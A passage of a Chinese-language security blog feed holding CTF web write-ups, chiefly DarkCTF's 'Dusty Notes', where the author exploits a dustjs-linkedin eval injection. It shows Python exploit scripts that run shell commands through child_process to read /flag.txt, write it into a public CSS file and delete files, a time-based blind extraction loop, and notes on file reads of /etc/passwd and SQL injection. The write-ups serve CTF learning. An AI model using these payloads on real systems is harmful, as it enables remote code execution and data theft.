href="https://github.com/mpgn/Rails-doubletap-RCE" target="_blank" rel="noopener">https://github.com/mpgn/Rails-doubletap-RCE</a></p><p>æœ€åè¿˜æ˜¯å†³å®šdockerèµ·äº†ä¸ª2.5.1çš„ç¯å¢ƒâ€¦â€¦ç„¶åç”¨è¿™ä¸ªexpæ—¶å…ˆbundle install (æ¢æº) + å®‰è£…nodejs + å»æ‰exploit.rbé‡Œçš„ä»£ç†å³å¯è¿è¡Œå¹¶åå¼¹shell<br><img src="https://upload-images.jianshu.io/upload_images/18060177-a1bee5391134b092.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-a1bee5391134b092.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p><code>flag:mctf{1_l0ve_rzhd</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DarkCTF-WEB</title>
      <link href="2020/09/25/DarkCTF-WEB/"/>
      <url>2020/09/25/DarkCTF-WEB/</url>
      
        <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡å‘æ–°æ–‡ç« äº†ã€‚æ­£å¥½å›½åº†å°±è¦åˆ°äº†ï¼ŒåŠ ä¸Šè¿˜æœ‰å·…å³°æå®¢è·Ÿå›½èµ›è¦æ‰“ã€‚æ‰€ä»¥å‘¨äº”æ™šä¸Šç»ƒæ‰‹äº†DarkCTFçš„é¢˜ç›®ï¼Œç¨å¾®èŠ±äº†å‡ å°æ—¶akæ‰å½“æ—¶æ”¾å‡ºçš„webã€‚å…¶ä¸­å¤§éƒ¨åˆ†éƒ½æ¯”è¾ƒç®€å•ï¼Œå…¶ä¸­ä¸€é“æ‹¿äº†äºŒè¡€çš„nodejsé¢˜ç›®æœ‰ç‚¹æ„æ€æ‰“ç®—ç¨å¾®è®°å½•ä¸‹ã€‚</p><a id="more"></a><h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><p>ç»™äº†æºç è·Ÿç½‘é¡µï¼Œä¸»ä½“ä¸Šå°±æ˜¯</p><pre><code class="php">&lt;?php$web = $_SERVER[&#39;HTTP_USER_AGENT&#39;];if (is_numeric($web)){      if (strlen($web) &lt; 4){          if ($web &gt; 10000){                 echo (&#39;&lt;div class=&quot;w3-panel w3-green&quot;&gt;&lt;h3&gt;Correct&lt;/h3&gt;  &lt;p&gt;darkCTF{}&lt;/p&gt;&lt;/div&gt;&#39;);          } else {                 echo (&#39;&lt;div class=&quot;w3-panel w3-red&quot;&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;  &lt;p&gt;Ohhhhh!!! Very Close  &lt;/p&gt;&lt;/div&gt;&#39;);          }      } else {             echo (&#39;&lt;div class=&quot;w3-panel w3-red&quot;&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;  &lt;p&gt;Nice!!! Near But Far&lt;/p&gt;&lt;/div&gt;&#39;);      }} else {    echo (&#39;&lt;div class=&quot;w3-panel w3-red&quot;&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;  &lt;p&gt;Ahhhhh!!! Try Not Easy&lt;/p&gt;&lt;/div&gt;&#39;);}?&gt;</code></pre><p>å–UserAgentä½œä¸ºå‚æ•°ï¼Œåˆ¤æ–­äº†å­—ç¬¦ä¸²é•¿åº¦ä¸æ•°å€¼å¤§å°ã€‚ç®€å•ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•<code>9E9</code>å³å¯ç»•è¿‡</p><h2 id="Apache-Logs"><a href="#Apache-Logs" class="headerlink" title="Apache Logs"></a>Apache Logs</h2><p>ç»™äº†ä¸ªzipç„¶åè®©ä½ ä»é‡Œé¢çš„logæ–‡ä»¶é‡Œæ‰¾flag.ç®€å•æå–å‡ºå…¶ä¸­String.fromCharCodeéƒ¨åˆ†æ”¾åˆ°æµè§ˆå™¨consoleé‡Œè½¬ä¸€ä¸‹å³å¯ã€‚ä¸è¿‡æäº¤æ—¶è¦ç”¨<code>darkCTF</code>è€Œä¸æ˜¯<code>DarkCTF</code></p><h2 id="So-Simple"><a href="#So-Simple" class="headerlink" title="So_Simple"></a>So_Simple</h2><p>å¼€å§‹æ²¡å•¥å¤´ç»ªã€‚åæ¥å‘ç°æç¤ºäº†ä¼ å‚id.äºæ˜¯å¾ˆç®€å•å°±èƒ½å‘ç°æ˜¯ä¸ªsqlæ³¨å…¥ã€‚ç”šè‡³åŸºæœ¬ä¸Šå°±æ˜¯sqli-labsçš„ç¬¬ä¸€å…³ã€‚unionæ³¨å…¥ä»usersè¡¨ä¸­çš„passwordé‡Œæ‰¾åˆ°æŸä¸ªflag.</p><h2 id="Simple-SQL"><a href="#Simple-SQL" class="headerlink" title="Simple_SQL"></a>Simple_SQL</h2><p>ç›´æ¥æç¤ºä¼ å‚id.<br>æ™®é€šå¸ƒå°”ç›²æ³¨ã€‚æ²¡å•¥è¯´çš„ã€‚</p><h2 id="Dusty-Notes"><a href="#Dusty-Notes" class="headerlink" title="Dusty Notes"></a>Dusty Notes</h2><p><img src="/2020/09/25/DarkCTF-WEB/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿™é¢˜èŠ±äº†ä¸€äº›æ—¶é—´ã€‚ä¸è¿‡åšå‡ºæ¥æ—¶æ‹¿äº†äºŒè¡€è¿˜æ˜¯æŒºèˆ’æœçš„ã€‚çœ‹åˆ°Defenitæ˜¯ä¸€è¡€ä¸çŸ¥é“æ˜¯ä¸æ˜¯åˆè¢«posixå¸ˆå‚…ç§’æ‰äº†ã€‚ï¼ˆposix nodejs æ°¸è¿œçš„ç¥ï¼‰</p><p>é¦–å…ˆé¢˜ç›®æ˜¯é»‘ç›’æµ‹è¯•çš„ã€‚è¿™ç‚¹å¯¹äºä¸€ä¸ªnodejsé¢˜ç›®æ¥è¯´å¢åŠ äº†ä¸å°‘éš¾åº¦ã€‚å¦‚æœæ˜¯æˆ‘å‡ºè¿™é¢˜å¯èƒ½å°±ç›´æ¥ç»™æºç äº†ã€‚ä½†æ˜¯åšå®Œåæˆ‘æ„Ÿè§‰è¿™ç§è®¾è®¡è¿˜æ˜¯å¾ˆè´´è¿‘ç°å®çš„ã€‚ä¹Ÿç»™äº†æˆ‘ä¸€å®šç¨‹åº¦ä¸Šé»‘ç›’æµ‹nodejsçš„æ‰‹æ®µã€‚</p><p>é¦–å…ˆé¢˜ç›®å¤§è‡´å®ç°äº†ä¸€ä¸ªnoteåŠŸèƒ½ã€‚å¯ä»¥é€šè¿‡<code>addNotes</code>è·¯ç”±ä¼ å‚messageã€‚é€šè¿‡<code>deleteNote/{id}</code>æ¥åˆ é™¤note.<br><img src="/2020/09/25/DarkCTF-WEB/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä¸è¿‡ç®€å•çœ‹äº†ä¸‹cookieå‘ç°å†…å®¹å¯ä»¥ç”±cookieæ§åˆ¶</p><pre><code>//notej:[{&quot;id&quot;:1,&quot;body&quot;:&quot;Hack this&quot;},{&quot;id&quot;:2,&quot;body&quot;:&quot;1&quot;}]</code></pre><p>åˆ°è¿™ä¸€æ­¥ä¸ºæ­¢æˆ‘æœ‰å‡ ç§æ€è·¯<br>1.nodejsååºåˆ—åŒ–ã€‚<br>2.åŸå‹é“¾æ±¡æŸ“<br>3.ï¼Ÿï¼Ÿï¼Ÿ</p><p>é¦–å…ˆæƒ³åˆ°nodejsååºåˆ—åŒ–æ˜¯å› ä¸ºä»¥å‰NahamconCTFè§£å‡ºçš„ä¸€é“nodeé¢˜ã€‚ä¹Ÿæ˜¯é»‘ç›’ã€‚ç„¶ååªæœ‰20å¤šè§£ã€‚ä½†æ˜¯æˆ‘å½“æ—¶æ˜¯æŠ±ç€è¯•ä¸€è¯•çš„å¿ƒæ€å°è¯•äº†ä¸‹ååºåˆ—åŒ–å±…ç„¶æˆåŠŸæ‹¿åˆ°shell.åæ¥å‘ç°ï¼Œä¹‹æ‰€ä»¥ä¼šæœ‰è¿™ç§æƒ³æ³•å°±æ˜¯å› ä¸º:<br><strong>æ•°æ®ä¸ºjsonä¸²ã€‚æ•°æ®ç”±cookieæ§åˆ¶</strong><br>åºåˆ—åŒ–è¾“å‡ºçš„ç»“æœå°±æ˜¯jsonä¸²,æ‰€ä»¥é»‘ç›’ä¸‹å°è¯•node-serializeæœªå°ä¸å¯ã€‚å½“ç„¶æœ¬é¢˜è‡ªç„¶æ˜¯å¤±è´¥äº†ã€‚å› æ­¤æ–¹æ³•ä¹Ÿä¸å†å¤šè¯´ã€‚</p><p>ç¬¬äºŒç§æƒ³æ³•è‡ªç„¶æ˜¯å› ä¸ºnodejsä¸­æƒ³è¦å‡ºç°åŸå‹é“¾æ±¡æŸ“å®åœ¨æ˜¯å¤ªå®¹æ˜“äº†ã€‚ä¸è¿‡æœ‰ä¸€è¯´ä¸€ä¸€é“ä»¥åŸå‹é“¾æ±¡æŸ“ä¸ºæ¼æ´çš„ctfé¢˜ä½¿ç”¨å…¬å…±é¶æœºæ˜¯éå¸¸ä¸å¦¥çš„ï¼Œå¹¶ä¸”ä¸€èˆ¬æ˜¯ç»™å‡ºæºç è¿›è¡Œæµ‹è¯•ã€‚åŠ ä¸Šæ­¤å¤„å¹¶æ²¡æœ‰ä»€ä¹ˆæ˜¾çœ¼çš„æ¨¡æ¿ä½¿ç”¨æ¯”å¦‚ejsã€‚å› æ­¤æ˜¯åŸå‹é“¾æ±¡æŸ“çš„å¯èƒ½æ€§ä¹Ÿä¸å¤§ã€‚</p><p>æ­¤æ—¶åŸºæœ¬ä¸Šå¸¸è§„çš„æ€è·¯å·²ç»èµ°ä¸é€šäº†ã€‚ä½†æ˜¯æˆ‘ç®€å•fuzzäº†ä¸€ä¸‹</p><pre><code>addNotes?note[]=1addNotes?note[toString]=1</code></pre><p>å‘ç°å®ƒæ˜¯æ²¡æœ‰åšåªèƒ½ä¼ å­—ç¬¦ä¸²çš„é™åˆ¶çš„ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸å¯¹å‚æ•°ç±»å‹åšé™åˆ¶æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥æ•°ç»„æˆ–å¯¹è±¡ã€‚å› æ­¤åœ¨ä¼ å…¥å¯¹è±¡æ—¶è¿™é‡Œä¼šè§¦å‘æŠ¥é”™ã€‚<br>ç„¶åé‡ç‚¹å°±æ¥äº†ï¼Œè§¦å‘çš„æŠ¥é”™å†…å®¹å¦‚ä¸‹</p><pre><code>{&quot;stack&quot;:&quot;TypeError: Cannot convert object to primitive value\n    at Tap.head (/app/node_modules/dustjs-helpers/lib/dust-helpers.js:121:25)\n    at Tap.go (/app/node_modules/dustjs-linkedin/lib/dust.js:812:19)\n    at Chunk.write (/app/node_modules/dustjs-linkedin/lib/dust.js:556:19)\n    at Chunk.reference (/app/node_modules/dustjs-linkedin/lib/dust.js:611:19)\n    at body_4 (evalmachine.&lt;anonymous&gt;:1:1634)\n    at Chunk.render (/app/node_modules/dustjs-linkedin/lib/dust.js:598:12)\n    at Object.tap (/app/node_modules/dustjs-helpers/lib/dust-helpers.js:123:8)\n    at Object.if (/app/node_modules/dustjs-helpers/lib/dust-helpers.js:213:27)\n    at Chunk.helper (/app/node_modules/dustjs-linkedin/lib/dust.js:769:34)\n    at body_1 (evalmachine.&lt;anonymous&gt;:1:972)\n    at Chunk.section (/app/node_modules/dustjs-linkedin/lib/dust.js:654:21)\n    at body_0 (evalmachine.&lt;anonymous&gt;:1:847)\n    at /app/node_modules/dustjs-linkedin/lib/dust.js:122:11\n    at processTicksAndRejections (internal/process/task_queues.js:79:11)&quot;,&quot;message&quot;:&quot;Cannot convert object to primitive value&quot;}</code></pre><p>çˆ†å‡ºäº†å½“å‰è·¯å¾„<code>/app</code>ä»¥åŠä¸€ä¸ªä¾èµ–<code>dustjs-linkedin/lib/dust.js</code><br>(è¿™é‡Œå¤šå˜´ä¸€å¥ï¼Œè¿™é‡Œä¸€å¼€å§‹defenitæ‹¿åˆ°ä¸€è¡€åé•¿è¾¾4ä¸ªå¤šå°æ—¶éƒ½æ²¡æœ‰å…¶ä»–è§£ï¼Œå¹¶ä¸”å½“æ—¶è§¦å‘æŠ¥é”™æ—¶é¢˜ç›®åªä¼šçˆ†500è€Œä¸æ˜¯åƒä¸Šé¢è¿™æ ·æ‰“å°æŠ¥é”™traceback,åæ¥æ”¹äº†é¢˜æ‰æœ‰äº†è¿™ä¸ªæŠ¥é”™æ ˆ)</p><p>çœ‹åˆ°è¿™ä¸ª<code>dust</code>åŠ ä¸Šé¢˜ç›®åä¸­çš„dustï¼Œå»æœç´¢ä¸€æ³¢çš„è¯ä¸éš¾å‘ç°å­˜åœ¨ä¸€ä¸ªæ¼æ´<br>å¹¶ä¸”æœ‰æ–‡ç« åœ¨å®æˆ˜ä¸­é‡åˆ°è§£å†³<br><a href="https://artsploit.blogspot.com/2016/08/pprce2.html" target="_blank" rel="noopener">https://artsploit.blogspot.com/2016/08/pprce2.html</a></p><p>ç®€å•è¯´å°±æ˜¯ï¼Œdustçš„æ¨¡æ¿ä¼šè¿›å…¥ä¸€ä¸ªifè¯­å¥æ‰§è¡Œ<code>eval</code>ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç›´æ¥ä¼ å…¥å‚æ•°æ—¶å®ƒä¼šæŠŠæ•æ„Ÿå­—ç¬¦åšå¤„ç†ï¼Œè€Œå¦‚æœä¼ å…¥æ•°ç»„æ—¶åˆ™ä¸ä¼šå¤„ç†æ•æ„Ÿå­—ç¬¦ï¼Œå³å¯rceã€‚</p><p>å†å¤šå˜´ä¸€å¥ï¼Œåˆ°ç¡®å®šæ˜¯dustçš„æ´è¿™ä¸€æ­¥æˆ‘æœ¬æ¥ä»¥ä¸ºå¼¹ä¸ªshellå°±å®Œäº‹äº†ã€‚ç»“æœæµ‹äº†å¥½ä¹…å‘ç°ä¸çŸ¥é“æ˜¯ä¸é€šå¤–ç½‘è¿˜æ˜¯æ²¡èƒ½æ‰§è¡Œã€‚å·®ç‚¹ä»¥ä¸ºæ‰¾é”™æ´äº†ã€‚ç›´åˆ°ä»–æ”¹äº†é¢˜æ‰å‘ç°dustä¾èµ–ç¡®è®¤æ²¡æ‰¾é”™æ´ï¼Œä¸“å¿ƒæµ‹ä¸‹å»çš„ã€‚<br>å½“ç„¶æ²¡æœ‰æŠ¥é”™æˆ‘ä»¬ä¹Ÿæœ‰å‡ ç§åŠæ³•ç¡®è®¤æ­¤å¤„å­˜åœ¨dustçš„evalæ¼æ´<br>æ¯”å¦‚</p><pre><code>addNotes?message=aaa%5C</code></pre><p>ä¼šå¯¼è‡´</p><pre><code>eval(&quot;&#39;xxx\&#39; == &#39;desktop&#39;&quot;);</code></pre><p>è§¦å‘æŠ¥é”™<br>å†æ¯”å¦‚</p><pre><code>addNotes?message[]=&amp;message[]=y%27-console.log(7)</code></pre><p>ä¹Ÿä¼šæŠ¥é”™ã€‚å› ä¸ºæˆ‘ä»¬æ­¤æ—¶å¼•å·æ²¡æœ‰è¢«è½¬ä¹‰ç›´æ¥é€å…¥eval.è§¦å‘æŠ¥é”™ã€‚<br>æ‰€ä»¥ï¼Œå¦‚æœæœ‰ç€è‰¯å¥½çš„FUZZæ‰‹æ®µï¼Œé»‘ç›’ä¹Ÿå¯ä»¥fuzzå‡ºé—®é¢˜å¹¶ç¡®è®¤ä¾èµ–é”™è¯¯ã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨evalè¯­å¥å‘½ä»¤æ‰§è¡Œã€‚å½“ç„¶å› ä¸ºä¸é€šå¤–ç½‘æ²¡æœ‰å›æ˜¾æ‰€ä»¥éå¸¸ç‹—ã€‚æˆ‘æœ€åé€‰æ‹©æŠŠç»“æœå†™é™æ€æ–‡ä»¶ã€‚å¹¶ä¸”è¿™é‡Œé™æ€ç›®å½•æ˜¯çŒœäº†ä¸€æ‰‹<code>public</code>ã€‚æ‰€ä»¥å¯ä»¥ç›´æ¥å†™<code>/proc/self/cwd/public/css/style.css</code>æˆ–è€…åœ¨çˆ†å‡ºæ˜¯appç›®å½•åç›´æ¥å†™<code>/app/public/css</code><br>exp</p><pre><code class="python">url=&quot;http://dusty.darkarmy.xyz/&quot;data=&quot;&quot;&quot;j:[{&quot;id&quot;:1,&quot;body&quot;: [&quot;1&quot;,&quot;1&#39;-console.log(require(&#39;child_process&#39;).exec(&#39;cat /flag.txt &gt; /app/public/css/style.css&#39;).toString());//&quot;]}]&quot;&quot;&quot;print(quote(data))r=requests.get(url,cookies={&#39;note&#39;:quote(data)})print(r.text)r=requests.get(url+&#39;css/style.css&#39;)print(r.text)data=&quot;&quot;&quot;j:[{&quot;id&quot;:1,&quot;body&quot;: [&quot;1&quot;,&quot;1&#39;-console.log(require(&#39;child_process&#39;).exec(&#39;rm /app/public/css/style.css&#39;).toString());//&quot;]}]&quot;&quot;&quot;print(quote(data))r=requests.get(url,cookies={&#39;note&#39;:quote(data)})</code></pre><p>cookieå¯æ§æ‰€æœ‰å†…å®¹ä¸Šé¢è¯´è¿‡äº†ã€‚åªä¸è¿‡æµ‹è¯•æ—¶å› ä¸ºè·¯ç”±å¥½ç”¨å°±æ²¡æ§cookie.</p><p>åšå‡ºæ¥åé—®äº†ä¸‹å‡ºé¢˜äººæœç„¶ä¸æ˜¯é¢„æœŸã€‚å½“ç„¶è¿™é‡Œæˆ‘ä¸å¤ªç¡®å®šé¢„æœŸæ˜¯å•¥ï¼Œä¸è¿‡å·®çš„åº”è¯¥ä¸å¤šã€‚å½“ç„¶èŠå®Œåå‡ºé¢˜äººé¡ºæ‰‹ä¿®äº†ä¸‹å†™æ–‡ä»¶çš„æƒé™ :ï¼‰<br>ç„¶åå°±æ˜¯è¿™ç§åšæ³•æˆ‘è‡ªå·±ä¹Ÿä¸æ˜¯å¾ˆå–œæ¬¢ã€‚è‡ªå·±å‡ºè¿‡çš„nodejsé¢˜ç›®åœ¨å¯ä»¥rceçš„æƒ…å†µä¸‹æˆ‘éƒ½æŠŠå·¥ä½œç›®å½•æŒ‰rootæƒé™è®¾ç½®ã€‚å°±æ˜¯ä¸ºäº†é˜²æ­¢å†™æ–‡ä»¶ã€‚ä¸è¿‡ä¸€èˆ¬ä¼šé…ç½®äº†é˜²æ­¢æ—¶é—´ç›²æ³¨ï¼Œæ‰€ä»¥éƒ½ä¼šç»™å‡ºrceçš„å›æ˜¾</p><p>æ‰€ä»¥è¿™é‡ŒçŒœä¸€æ‰‹æœ¬é¢˜é¢„æœŸçš„æ–¹æ³•æ˜¯time-based-rce:<br>exp</p><pre><code class="python">import timeimport requestsfrom urllib.parse import quote,unquoteimport stringurl=&quot;http://dusty.darkarmy.xyz/&quot;def js_exp(str1):    x=[]    str1 = str1.strip(&#39; &#39;)    for ch in str1:        x.append(str(ord(ch)))    t=&#39;,&#39;.join(x)    result=&#39;eval(String.fromCharCode(&#39;+t+&#39;))&#39;    return resultflag=&quot;&quot;for num in range(1,50):    print(num)    for i in string.printable:        cmd = &quot;&quot;&quot;require(&#39;child_process&#39;).execSync(`if [ $(cat /flag.txt | cut -c {}) = &#39;{}&#39; ];then sleep 3;fi`)&quot;&quot;&quot;.format(num,i)        payload = js_exp(cmd)        data = &quot;&quot;&quot;j:[{&quot;id&quot;:1,&quot;body&quot;: [&quot;1&quot;,&quot;1&#39;-&quot;&quot;&quot; + payload + &quot;&quot;&quot;;//&quot;]}]&quot;&quot;&quot;        t = time.time()        r = requests.get(url, cookies={&#39;note&#39;: quote(data)})        if time.time() - t &gt; 3:            flag += i            print(flag)            break</code></pre><p>flag:<br><code>darkCTF{n0d3js_l1br4r13s_go3s_brrrr!}</code></p><p>å› ä¸ºä¸€äº›æ ¼å¼åŸå› ã€‚æˆ‘æŠŠpayloadç”¨evalè½¬åŒ–äº†ä¸€ä¸‹ï¼Œè¿™æ ·çœ‹èµ·æ¥æ›´èˆ’æœä¸€äº›.å¹¶ä¸”ä¸ç”¨æ‹…å¿ƒå¥‡å¥‡æ€ªæ€ªçš„å¼•å·é—®é¢˜ :)</p><p>ä¸è¿‡é¢˜ç›®æˆ‘è§‰å¾—å¾ˆæœ‰å¯å‘æ€§ï¼Œä¸»è¦æ˜¯ç»™äº†æˆ‘ä¸€äº›é¢å¯¹nodejsé»‘ç›’å¤„ç†çš„æ‰‹æ®µã€‚é‚£å°±æ˜¯åˆ©ç”¨å…¶å®¹æ˜“æŠ¥é”™çš„ç‰¹æ€§è¿›è¡ŒFUZZï¼Œå¾—åˆ°ç›®å½•è¿™æ ·çš„å…³é”®ä¿¡æ¯ï¼Œæˆ–è€…æ˜¯ä¾èµ–çš„å…³é”®ä¿¡æ¯ã€‚åŒæ—¶ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥æ¨æµ‹è¯­å¥ï¼Œç”šè‡³ä¸éœ€è¦çŸ¥é“ä¾èµ–æ¼æ´çš„ç»†èŠ‚å°±èƒ½ç›´æ¥ä¸Šæ‰‹ã€‚</p><p>æœ€åé“ä¸ªæ­‰ï¼Œå› ä¸ºæŠŠflagå†™åˆ°cssé‡Œåè‡ªå·±å°±æŠŠcssç»™åˆ äº†ã€‚å¯¼è‡´åé¢é¢˜ç›®ä¸€ç›´æ²¡æœ‰style.cssâ€¦â€¦</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>åé¢çš„é¢˜åœ¨æ‰“å·…å³°æå®¢æ‘¸é±¼æ—¶çœ‹äº†çœ‹ã€‚åšäº†ä¸ªå…¥é—¨é¢˜è·Ÿä¸€ä¸ªUser-Agentçš„æŠ¥é”™æ³¨å…¥ã€‚æ€»ä¹‹éš¾åº¦æ•´ä½“å¾ˆå…¥é—¨å°±æ²¡ç»§ç»­çœ‹äº†ã€‚<br>æ²¡å•¥è¯´çš„ã€‚å·…å³°æå®¢ä½“éªŒäº†ä¸€æŠŠå¸¦é£çš„æ„Ÿè§‰ã€‚å›½èµ›å°±è¦é è‡ªå·±åŠ¨æ‰‹ä¸°è¡£è¶³é£Ÿäº†ã€‚åŠ æ²¹å§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é’“é±¼åŸ-zblog</title>
      <link href="2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E-zblog/"/>
      <url>2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E-zblog/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘å¿™ç€å¤ä¹ å»äº†ã€‚ç­‰åˆ°ä¸­åˆæ¦‚ç»Ÿçš„å¤ä¹ è¯¾ç»“æŸäº†æ‰æœ‰æ—¶é—´å®Œæ•´çœ‹ä¸‹é¢˜ã€‚é™¤å¼€ä¸€é“web-pwn,å‰©ä¸‹ä¸¤ä¸ªphpéƒ½æ˜¯å¸¸è§„è€ƒç‚¹,å°±æ˜¯è„‘æ´è·Ÿç¯å¢ƒçœŸå¿ƒæ¶å¿ƒäººã€‚å­¦å¼Ÿä»¬ä¹Ÿè½»æ¾è§£å†³ï¼Œåº”è¯¥ä¸éœ€è¦ä»€ä¹ˆè®°å½•ã€‚æˆ‘è‡ªå·±åšäº†ä¸‹zblogè¿™é“javaé¢˜,ç®€å•è®°å½•ä¸‹ã€‚</p><a id="more"></a><p>æœ€è¿‘ciscnèµ›åŒºç¬¬7æ‰“è¿›åˆ†åŒºèµ›ã€‚å¼ºç½‘æ¯è·Ÿç€SUæ‹¿äº†ç¬¬12ã€‚(å°±æ˜¯è‡ªå·±å¤ªæäº†,éš¾é¢˜ä¸€å¾‹å¡å£³,æœç„¶ä¸å¥½å¥½ç ”ç©¶phpè·Ÿjavaæ˜¯æ²¡æœ‰å‡ºè·¯çš„).ç„¶åä¸ºäº†å›½èµ›å‡ºäº†é“Node.jsä¸çŸ¥é“æœ‰æ²¡æœ‰æœºä¼šæ‹¿åˆ°åˆ«çš„èµ›åŒºå»,ä¼°è®¡çœŸæ‹¿äº†ä¼šä¸¢äººå§ã€‚å¤ä¹ çš„æ—¶é—´ä¹Ÿå¾ˆå°‘ã€‚ä¸çŸ¥é“è€ƒè¯•ä¼šä¸ä¼šç‚¸â€¦â€¦ä½†æ˜¯æ¯æ¬¡ç»“æŸä¸€ä¸ªé˜¶æ®µæ€»è¦å†™å†™æ–‡ç« çš„ã€‚æ‰€ä»¥å½¢å¼åŒ–åœ°å†™å†™ã€‚</p><h2 id="zblog"><a href="#zblog" class="headerlink" title="zblog"></a>zblog</h2><p>ç®€å•java.å°±æ˜¯ç¯å¢ƒå¡çš„è¦æ­»ã€‚</p><p>titleå‚æ•°å­˜åœ¨æ–‡ä»¶è¯»å–ã€‚åé¢çœ‹æºç ä¼šå‘ç°æ˜¯ä»»æ„æ¨¡æ¿æ–‡ä»¶æ¸²æŸ“çš„ã€‚<br>è¿™é‡Œæ²¡è®°é”™çš„è¯æœ‰ä¸ªå°ç»†èŠ‚å°±æ˜¯ä¸èƒ½éšä¾¿æ’<code>../</code>æ¥ç©¿è¶Šè·¯å¾„ã€‚åé¢ä¼šå‘ç°å®ƒæ˜¯æ‹¼æ¥è·¯å¾„çš„æ‰€ä»¥è·¯å¾„ä¸èƒ½éšä¾¿æ„é€ ã€‚è€Œä¸”ä¼¼ä¹ä¸€å¼€å§‹å°è¯•è¯»æ–‡ä»¶çš„æ—¶å€™æœ‰ç‚¹è¿·ã€‚æ–‡ä»¶æœ«å°¾åŠ äº†ä¸ª<code>/</code>æ‰èƒ½è¯»åˆ°,ä¸åŠ è¯»ä¸åˆ°ã€‚ä¸çŸ¥é“æ˜¯ä»€ä¹ˆç¥å¿…æ“ä½œã€‚ç„¶ååæ¥å¥½åƒåˆç»™ä¿®å¥½äº†ï¼Ÿï¼Ÿï¼Ÿ</p><p>æ€»ä¹‹fuzzä¸€ä¸‹å¯ä»¥æ‰¾åˆ°æ ¹ç›®å½•çš„ä½ç½®è¯»åˆ°<code>/etc/passwd</code>ã€‚æ¥ç€è¯»ä¸‹<code>/proc/self/cmdline</code>ã€‚</p><pre><code class="bash">java -jar /home/ctf/web/target/web-1.0-SNAPSHOT-jar-with-dependencies.jar</code></pre><p>ä¸ªäººè§‰å¾—pythonè·Ÿjavaç¯å¢ƒåœ¨æœ‰arbitary file readçš„æƒ…å†µä¸‹è¯»ä¸‹cmdlineæŒºé‡è¦çš„ã€‚åŸºæœ¬éƒ½ä¼šæš´éœ²ç»å¯¹è·¯å¾„ã€‚æ¯”å¦‚æ­¤å¤„ã€‚<br>æ›´é‡è¦çš„æ˜¯è¿™ä¸ªtarget.å†™è¿‡mavené¡¹ç›®çš„éƒ½çŸ¥é“maven buildå¥½çš„å†…å®¹éƒ½æ”¾åœ¨targetæ–‡ä»¶å¤¹ä¸‹ã€‚æ‰€ä»¥è¿™é‡ŒåŸºæœ¬ç¡®å®šèƒ½å¤Ÿç¡®å®šæŒ‰mavené¡¹ç›®ç»“æ„æ¥è¯»æ–‡ä»¶ã€‚</p><p>åªè¦çŸ¥é“ç»“æ„å°±ç­‰äºæŠŠæ‰€æœ‰æ–‡ä»¶éƒ½æš´éœ²å‡ºæ¥äº†ã€‚<br><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E-zblog/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å…ˆè¯»ä¸‹pom.xmlã€‚å‘ç°</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;groupId&gt;ctf&lt;/groupId&gt;    &lt;artifactId&gt;web&lt;/artifactId&gt;    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;    